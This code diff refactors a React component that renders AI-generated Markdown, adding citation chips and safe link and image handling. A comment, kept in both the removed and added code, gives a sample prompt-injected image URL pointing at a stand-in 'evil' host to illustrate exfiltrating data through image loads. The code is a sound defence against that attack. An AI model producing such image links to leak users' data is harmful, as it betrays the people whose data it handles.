@@ -1,4 +1,4 @@
-import type { ReactNode } from 'react'
+import { createContext, type ReactNode, useContext } from 'react'
 import ReactMarkdown from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import { codePoint, highlight, splitHidden } from '../../lib/style/highlight'
@@ -79,6 +79,54 @@ function Pre({ node, children }: { node?: unknown; children?: ReactNode }) {
   return <pre>{children}</pre>
 }
 
+// What a link needs to become a citation chip. Link reads it from here, so it, like every component below, is made
+// once: made anew at each render, a component is a new type to React, which would mount every link and chip again
+// (a chip that opened the code drawer would be gone when focus goes back to it).
+const Cites = createContext<{ citations: Citation[]; repo: Pick<Repo, 'url'>; onCite: (c: CiteTarget) => void } | null>(
+  null,
+)
+
+function Link({ href, children }: { href?: string; children?: ReactNode }) {
+  const cites = useContext(Cites)
+  const c = cites && parseCitation(href, cites.repo)
+  // The model can write a link into the source itself; only one the citations hold was checked.
+  if (c && cites.citations.some((v) => v.path === c.path && v.startLine === c.startLine && v.endLine === c.endLine)) {
+    return <CitationChip {...c} onClick={() => cites.onCite(c)} />
+  }
+  // In-page: stays in this tab, and reaches a wiki heading by the id it was given (WikiArticle).
+  if (href?.startsWith('#'))
+    return <a href={href === '#' ? href : `#${headingId(decode(href.slice(1)))}`}>{children}</a>
+  return <Outbound href={href}>{children}</Outbound>
+}
+
+// Generated text never loads an image: its URL could carry data away (a prompt-injected ![](https://evil/?q=…)).
+// It becomes a link instead, its host shown like any other's.
+function Img({ src, alt }: { src?: unknown; alt?: string }) {
+  return typeof src === 'string' && src ? <Outbound href={src}>{alt || src}</Outbound> : alt
+}
+
+// A table wider than the text scrolls in its own box; its cells wrap between words.
+function Table({ children }: { children?: ReactNode }) {
+  return (
+    <div className="mb-[18px] overflow-x-auto print:overflow-visible">
+      <table>{children}</table>
+    </div>
+  )
+}
+
+// A code block ends in a newline; inline code never holds one. Every block is highlighted, in a known language
+// or not, so its hidden characters show; inline code had them marked by revealHidden.
+function Code({ className, children }: { className?: string; children?: ReactNode }) {
+  if (typeof children !== 'string' || !children.endsWith('\n')) return <code>{children}</code>
+  const lang = /language-([\w.-]+)/.exec(className ?? '')?.[1] ?? ''
+  return (
+    // biome-ignore lint/security/noDangerouslySetInnerHtml: highlight() escapes the code and marks its hidden characters
+    <code className="hljs" dangerouslySetInnerHTML={{ __html: highlight(children.slice(0, -1), lang) }} />
+  )
+}
+
+const parts = { a: Link, img: Img, table: Table, pre: Pre, code: Code }
+
 // The headings top takes the place of: those above it (an h3 under top h2 stays an h3).
 const above = { h2: ['h1', 'h2'], h3: ['h1', 'h2'], h4: ['h1', 'h2', 'h3'], h5: ['h1', 'h2', 'h3', 'h4'] }
 
@@ -101,53 +149,15 @@ export function Markdown({
 }) {
   return (
     <div className="markdown">
-      <ReactMarkdown
-        remarkPlugins={[remarkGfm]}
-        rehypePlugins={[revealHidden]}
-        components={{
-          ...(top ? Object.fromEntries(above[top].map((h) => [h, top])) : {}),
-          a({ href, children }) {
-            const c = parseCitation(href, repo)
-            // The model can write a link into the source itself; only one the citations hold was checked.
-            if (
-              c &&
-              citations.some((v) => v.path === c.path && v.startLine === c.startLine && v.endLine === c.endLine)
-            ) {
-              return <CitationChip {...c} onClick={() => onCite(c)} />
-            }
-            // In-page: stays in this tab, and reaches a wiki heading by the id it was given (WikiArticle).
-            if (href?.startsWith('#'))
-              return <a href={href === '#' ? href : `#${headingId(decode(href.slice(1)))}`}>{children}</a>
-            return <Outbound href={href}>{children}</Outbound>
-          },
-          // Generated text never loads an image: its URL could carry data away (a prompt-injected ![](https://evil/?q=…)).
-          // It becomes a link instead, its host shown like any other's.
-          img({ src, alt }) {
-            return typeof src === 'string' && src ? <Outbound href={src}>{alt || src}</Outbound> : alt
-          },
-          // A table wider than the text scrolls in its own box; its cells wrap between words.
-          table({ children }) {
-            return (
-              <div className="mb-[18px] overflow-x-auto print:overflow-visible">
-                <table>{children}</table>
-              </div>
-            )
-          },
-          pre: Pre,
-          // A code block ends in a newline; inline code never holds one. Every block is highlighted, in a known language
-          // or not, so its hidden characters show; inline code had them marked by revealHidden.
-          code({ className, children }) {
-            if (typeof children !== 'string' || !children.endsWith('\n')) return <code>{children}</code>
-            const lang = /language-([\w.-]+)/.exec(className ?? '')?.[1] ?? ''
-            return (
-              // biome-ignore lint/security/noDangerouslySetInnerHtml: highlight() escapes the code and marks its hidden characters
-              <code className="hljs" dangerouslySetInnerHTML={{ __html: highlight(children.slice(0, -1), lang) }} />
-            )
-          },
-        }}
-      >
-        {text}
-      </ReactMarkdown>
+      <Cites value={{ citations, repo, onCite }}>
+        <ReactMarkdown
+          remarkPlugins={[remarkGfm]}
+          rehypePlugins={[revealHidden]}
+          components={top ? { ...Object.fromEntries(above[top].map((h) => [h, top])), ...parts } : parts}
+        >
+          {text}
+        </ReactMarkdown>
+      </Cites>
     </div>
   )
 }
